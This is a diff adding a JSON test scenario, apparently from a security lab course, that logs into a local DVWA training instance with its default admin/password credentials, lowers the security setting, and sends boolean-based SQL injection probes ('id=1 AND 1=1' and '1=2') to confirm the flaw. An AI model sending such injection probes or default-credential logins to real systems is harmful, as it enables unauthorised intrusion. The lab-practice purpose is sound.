@@ -1,0 +1,91 @@
+{
+  "name": "DVWA SQLi Verified (Week2 boolean fingerprint + security low)",
+  "base_url": "http://192.168.64.7/dvwa",
+  "timeout": 20,
+  "steps": [
+    {
+      "id": "get_login",
+      "name": "GET login page (fetch user_token if present)",
+      "method": "GET",
+      "path": "/login.php",
+      "headers": {}
+    },
+    {
+      "id": "login",
+      "name": "POST login (admin/password + user_token if required)",
+      "method": "POST",
+      "path": "/login.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "username=admin&password=password&Login=Login&user_token={{user_token}}"
+    },
+    {
+      "id": "home_check",
+      "name": "Verify authenticated session (must contain Logout)",
+      "method": "GET",
+      "path": "/",
+      "headers": {}
+    },
+    {
+      "id": "get_security",
+      "name": "GET security page (fetch user_token if required)",
+      "method": "GET",
+      "path": "/security.php",
+      "headers": {}
+    },
+    {
+      "id": "set_security_low",
+      "name": "POST security=low (use user_token if required)",
+      "method": "POST",
+      "path": "/security.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "security=low&seclev_submit=Submit&user_token={{user_token}}"
+    },
+    {
+      "id": "security_check",
+      "name": "Confirm security is low",
+      "method": "GET",
+      "path": "/security.php",
+      "headers": {}
+    },
+    {
+      "id": "sqli_page",
+      "name": "Open SQLi page",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/",
+      "headers": {}
+    },
+    {
+      "id": "sqli_baseline",
+      "name": "SQLi baseline request (id=1)",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "headers": {}
+    },
+    {
+      "id": "sqli_true",
+      "name": "Boolean TRUE (id=1 AND 1=1)",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/?id=1%20AND%201%3D1&Submit=Submit",
+      "headers": {}
+    },
+    {
+      "id": "sqli_false",
+      "name": "Boolean FALSE (id=1 AND 1=2)",
+      "method": "GET",
+      "path": "/vulnerabilities/sqli/?id=1%20AND%201%3D2&Submit=Submit",
+      "headers": {}
+    }
+  ],
+  "success": {
+    "require_security_level": "low",
+    "boolean_diff": {
+      "baseline_step": "sqli_baseline",
+      "true_step": "sqli_true",
+      "false_step": "sqli_false"
+    }
+  }
+}
